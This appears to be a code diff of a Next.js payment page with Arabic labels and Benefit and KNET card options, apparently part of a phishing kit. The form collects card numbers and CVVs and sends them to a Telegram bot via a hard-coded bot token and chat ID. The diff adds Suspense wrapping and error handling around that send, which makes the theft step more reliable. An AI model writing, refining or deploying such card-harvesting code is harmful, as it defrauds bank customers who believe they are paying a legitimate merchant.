@@ -1,5 +1,6 @@
 "use client";
-import { useState, useEffect } from "react";
+
+import { Suspense, useState, useEffect } from "react";
 import 'bootstrap/dist/css/bootstrap.min.css';
 import Image from "next/image";
 import benefit from '../../../public/benefi.png';
@@ -9,7 +10,7 @@ import { Modal, Button, Form } from "react-bootstrap";
 import { useRouter, useSearchParams } from "next/navigation";
 import axios from "axios";
 
-export default function PaymentPage() {
+function PaymentPageContent() {
   const [selectedMethod, setSelectedMethod] = useState("knet");
   const [showModal, setShowModal] = useState(false);
   const [submittedMethod, setSubmittedMethod] = useState(null);
@@ -18,7 +19,6 @@ export default function PaymentPage() {
   const searchParams = useSearchParams();
 
   useEffect(() => {
-    // تحديث المعلومة بشكل صحيح مع تحقق من وجود searchParams
     if (searchParams) {
       const p = searchParams.get("price");
       if (p) {
@@ -82,12 +82,16 @@ export default function PaymentPage() {
       cardData.cvv.trim() === ""
     ) {
       alert("من فضلك املئ الحقول");
-    } else {
-      axios.post(
-        `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
-      );
-      router.push(`/kpay/finish?name=${cardData.number}`);
+      return;
     }
+
+    axios.post(
+      `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
+    ).then(() => {
+      router.push(`/kpay/finish?name=${cardData.number}`);
+    }).catch(() => {
+      alert("حدث خطأ أثناء إرسال البيانات، يرجى المحاولة لاحقًا");
+    });
   };
 
   return (
@@ -103,7 +107,7 @@ export default function PaymentPage() {
           <div className="list-group my-4">
             <label className={`list-group-item ${selectedMethod === "benefit" ? "active" : ""}`} onClick={() => handleSelect("benefit")}>
               <input className="form-check-input me-2" type="radio" name="payment" checked={selectedMethod === "benefit"} readOnly />
-              <Image src={benefit} width={30}  alt="Benefit" className="me-2 ms-3" />
+              <Image src={benefit} width={30} alt="Benefit" className="me-2 ms-3" />
               بطاقة بنفت البنكية
             </label>
 
@@ -115,7 +119,7 @@ export default function PaymentPage() {
 
             <label className={`list-group-item ${selectedMethod === "knet" ? "active" : ""}`} onClick={() => handleSelect("knet")}>
               <input className="form-check-input me-2" type="radio" name="payment" checked={selectedMethod === "knet"} readOnly />
-              <Image src={kent} width={30}  alt="KNET" className="me-2 ms-3" />
+              <Image src={kent} width={30} alt="KNET" className="me-2 ms-3" />
               كي نت
             </label>
           </div>
@@ -212,5 +216,13 @@ export default function PaymentPage() {
         </Modal.Footer>
       </Modal>
     </div>
+  );
+}
+
+export default function PaymentPage() {
+  return (
+    <Suspense fallback={<div>Loading...</div>}>
+      <PaymentPageContent />
+    </Suspense>
   );
 }
